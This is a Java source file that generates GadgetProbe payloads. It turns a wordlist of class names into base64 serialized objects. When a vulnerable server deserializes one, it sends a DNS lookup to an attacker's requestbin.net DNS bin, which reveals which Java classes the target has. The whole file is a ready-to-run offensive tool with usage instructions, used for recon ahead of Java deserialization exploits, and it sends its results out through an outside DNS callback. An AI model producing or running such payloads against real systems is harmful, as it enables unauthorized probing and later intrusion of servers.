/*
Used to generate GadgetProbe payloads in base64 with free dnsbin (https://requestbin.net/dns)
Usage: java -cp '.:GadgetProbe-1.0-SNAPSHOT-all.jar' gen_payloads.java wordlist.txt xxxx.d.requestbin.net
By Rayhan0x01
*/
import com.bishopfox.gadgetprobe.GadgetProbe;
import java.util.Base64;
import java.util.*;
import java.io.*;


class GenPayloads{

	public static void main(String args[])  throws IOException,
                                                      ClassNotFoundException {
    String fileName = args[0];
    String dnsbin = args[1];
    ArrayList<String> arrayList = new ArrayList<>();
    try (BufferedReader reader = new BufferedReader(new FileReader(fileName))) {
        while (reader.ready()) {
            arrayList.add(reader.readLine());
        }
    }
    catch (IOException e) {
        System.out.println(e.toString()); 
    }
    for (int counter = 0; counter < arrayList.size(); counter++) {              
        // Call the GadgetProbe constructor with your authoritative nameserver (or use Burp collaborator).
        GadgetProbe gp = new GadgetProbe(dnsbin);
        // The crafted object "obj" is now ready to be sent using any custom implementation :)
        Object obj = gp.getObject(arrayList.get(counter));
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutput out = new ObjectOutputStream(bos);
        out.writeObject(obj);
        String b64String = Base64.getEncoder().encodeToString(bos.toByteArray());
        System.out.println(b64String);         
      } 
	
	}

}
